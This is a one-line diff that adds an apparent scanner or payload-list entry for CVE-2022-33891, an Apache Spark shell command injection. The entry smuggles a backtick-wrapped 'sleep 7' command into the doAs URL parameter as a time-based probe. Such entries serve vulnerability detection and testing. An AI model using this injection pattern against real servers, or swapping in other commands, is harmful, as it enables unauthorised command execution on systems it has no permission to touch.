@@ -1,0 +1,1 @@
+CVE-2022-33891 - Apache Spark Shell Command Injection: url+/?doAs=`sleep 7`
